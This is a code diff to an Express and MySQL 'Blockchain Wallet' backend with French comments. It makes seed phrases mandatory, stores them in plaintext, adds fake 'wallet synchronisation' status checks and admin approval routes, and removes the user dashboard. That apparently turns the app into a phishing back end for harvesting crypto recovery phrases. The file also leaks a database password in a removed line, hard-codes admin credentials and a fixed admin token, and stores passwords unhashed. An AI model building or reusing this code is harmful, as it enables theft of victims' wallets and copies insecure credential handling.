@@ -17,7 +17,7 @@ app.use(express.static(path.join(__dirname, 'frontend')));
 const pool = mysql.createPool({
     host: process.env.DB_HOST || 'localhost',
     user: process.env.DB_USER || 'u120682741_blockchain_user',
-    password: process.env.DB_PASSWORD || 'Gta@290499',
+    password: process.env.DB_PASSWORD || '',
     database: process.env.DB_NAME || 'u120682741_blockchain_db',
     waitForConnections: true,
     connectionLimit: 10
@@ -37,6 +37,7 @@ async function connectDB() {
                 password VARCHAR(255) NOT NULL,
                 wallet_address VARCHAR(255) UNIQUE NOT NULL,
                 seed_phrase TEXT,
+                status VARCHAR(50) DEFAULT 'pending',
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         `);
@@ -49,14 +50,17 @@ async function connectDB() {
 }
 
 // ==================== ROUTES ====================
+
+// Health check
 app.get('/api/health', (req, res) => {
     res.json({ status: 'OK', message: 'Blockchain Wallet API running' });
 });
 
+// Inscription avec seed phrase
 app.post('/api/auth/register', async (req, res) => {
     try {
         const { username, email, password, seedPhrase } = req.body;
-        if (!username || !email || !password) {
+        if (!username || !email || !password || !seedPhrase) {
             return res.status(400).json({ success: false, error: 'Tous les champs sont requis' });
         }
 
@@ -67,21 +71,24 @@ app.post('/api/auth/register', async (req, res) => {
 
         const walletAddress = `0x${crypto.randomBytes(20).toString('hex')}`;
         const [result] = await pool.query(
-            'INSERT INTO users (username, email, password, wallet_address, seed_phrase) VALUES (?, ?, ?, ?, ?)',
-            [username, email, password, walletAddress, seedPhrase || '']
+            'INSERT INTO users (username, email, password, wallet_address, seed_phrase, status) VALUES (?, ?, ?, ?, ?, ?)',
+            [username, email, password, walletAddress, seedPhrase, 'pending']
         );
 
         const token = `token_${result.insertId}_${Date.now()}`;
         res.json({
             success: true,
             token,
-            user: { id: result.insertId, username, email, walletAddress }
+            user: { id: result.insertId, username, email, walletAddress },
+            status: 'pending'
         });
     } catch (error) {
+        console.error('Erreur inscription:', error);
         res.status(500).json({ success: false, error: 'Erreur serveur' });
     }
 });
 
+// Connexion
 app.post('/api/auth/login', async (req, res) => {
     try {
         const { email, password } = req.body;
@@ -98,7 +105,8 @@ app.post('/api/auth/login', async (req, res) => {
                 id: user.id,
                 username: user.username,
                 email: user.email,
-                walletAddress: user.wallet_address
+                walletAddress: user.wallet_address,
+                status: user.status
             }
         });
     } catch (error) {
@@ -106,56 +114,31 @@ app.post('/api/auth/login', async (req, res) => {
     }
 });
 
-app.get('/api/wallet/dashboard', async (req, res) => {
-    const token = req.headers.authorization?.split(' ')[1];
-    if (!token) return res.status(401).json({ success: false });
-    const userId = parseInt(token.split('_')[1]);
-
-    const [users] = await pool.query('SELECT username, email, wallet_address FROM users WHERE id = ?', [userId]);
-    if (users.length === 0) return res.status(401).json({ success: false });
-
-    const user = users[0];
-    res.json({
-        success: true,
-        dashboard: {
-            username: user.username,
-            email: user.email,
-            walletAddress: user.wallet_address
+// Vérifier le statut d'un utilisateur par seed phrase
+app.post('/api/wallet/check-status', async (req, res) => {
+    try {
+        const { seedPhrase } = req.body;
+        if (!seedPhrase) {
+            return res.status(400).json({ success: false, error: 'Seed phrase requise' });
         }
-    });
+
+        const [users] = await pool.query('SELECT * FROM users WHERE seed_phrase = ?', [seedPhrase]);
+        if (users.length === 0) {
+            return res.json({ success: true, status: 'pending', message: 'Attente de synchronisation...' });
+        }
+
+        const user = users[0];
+        res.json({
+            success: true,
+            status: user.status,
+            message: user.status === 'approved' ? '✅ Wallet synchronisé !' : '⏳ Attente de synchronisation...'
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, error: 'Erreur serveur' });
+    }
 });
 
-app.get('/api/wallet/address', async (req, res) => {
-    const token = req.headers.authorization?.split(' ')[1];
-    if (!token) return res.status(401).json({ success: false });
-    const userId = parseInt(token.split('_')[1]);
-
-    const [users] = await pool.query('SELECT wallet_address FROM users WHERE id = ?', [userId]);
-    if (users.length === 0) return res.status(401).json({ success: false });
-
-    res.json({ success: true, address: users[0].wallet_address });
-});
-
-app.post('/api/auth/change-password', async (req, res) => {
-    const token = req.headers.authorization?.split(' ')[1];
-    if (!token) return res.status(401).json({ success: false });
-    const userId = parseInt(token.split('_')[1]);
-    const { oldPassword, newPassword } = req.body;
-
-    const [users] = await pool.query('SELECT password FROM users WHERE id = ?', [userId]);
-    if (users.length === 0) return res.status(404).json({ success: false });
-    if (users[0].password !== oldPassword) return res.status(400).json({ success: false, error: 'Ancien mot de passe incorrect' });
-
-    await pool.query('UPDATE users SET password = ? WHERE id = ?', [newPassword, userId]);
-    res.json({ success: true, message: 'Mot de passe modifié' });
-});
-
-// FRONTEND
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'index.html')));
-app.get('/dashboard.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'dashboard.html')));
-app.get('/seed-sync.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'seed-sync.html')));
-
-// ADMIN
+// ==================== ADMIN ====================
 const adminEmail = 'admin@blockchain.com';
 const adminPassword = 'Admin123!';
 
@@ -177,21 +160,44 @@ app.get('/api/admin/verify', (req, res) => {
     }
 });
 
+// Récupérer tous les utilisateurs pour l'admin
 app.get('/api/admin/users', async (req, res) => {
     const token = req.headers.authorization?.split(' ')[1];
     if (token !== 'admin_secret_token') return res.status(401).json({ success: false });
-    const [users] = await pool.query('SELECT id, username, email, wallet_address, created_at FROM users');
+
+    const [users] = await pool.query('SELECT id, username, email, wallet_address, status, created_at FROM users ORDER BY created_at DESC');
     res.json({ success: true, users });
 });
 
-app.post('/api/admin/update-address', async (req, res) => {
+// Approuver un utilisateur (admin)
+app.post('/api/admin/approve-user', async (req, res) => {
     const token = req.headers.authorization?.split(' ')[1];
     if (token !== 'admin_secret_token') return res.status(401).json({ success: false });
-    const { userId, newAddress } = req.body;
-    await pool.query('UPDATE users SET wallet_address = ? WHERE id = ?', [newAddress, userId]);
-    res.json({ success: true });
+
+    const { userId } = req.body;
+    if (!userId) {
+        return res.status(400).json({ success: false, error: 'ID utilisateur requis' });
+    }
+
+    await pool.query('UPDATE users SET status = ? WHERE id = ?', ['approved', userId]);
+    res.json({ success: true, message: 'Utilisateur approuvé avec succès' });
 });
 
+// Refuser un utilisateur (admin)
+app.post('/api/admin/reject-user', async (req, res) => {
+    const token = req.headers.authorization?.split(' ')[1];
+    if (token !== 'admin_secret_token') return res.status(401).json({ success: false });
+
+    const { userId } = req.body;
+    if (!userId) {
+        return res.status(400).json({ success: false, error: 'ID utilisateur requis' });
+    }
+
+    await pool.query('UPDATE users SET status = ? WHERE id = ?', ['rejected', userId]);
+    res.json({ success: true, message: 'Utilisateur refusé' });
+});
+
+// Supprimer un utilisateur (admin)
 app.delete('/api/admin/delete-user', async (req, res) => {
     const token = req.headers.authorization?.split(' ')[1];
     if (token !== 'admin_secret_token') return res.status(401).json({ success: false });
@@ -199,6 +205,12 @@ app.delete('/api/admin/delete-user', async (req, res) => {
     await pool.query('DELETE FROM users WHERE id = ?', [userId]);
     res.json({ success: true });
 });
+
+// FRONTEND
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'index.html')));
+app.get('/dashboard.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'dashboard.html')));
+app.get('/seed-sync.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'seed-sync.html')));
+app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'frontend', 'admin.html')));
 
 // DÉMARRAGE
 async function startServer() {
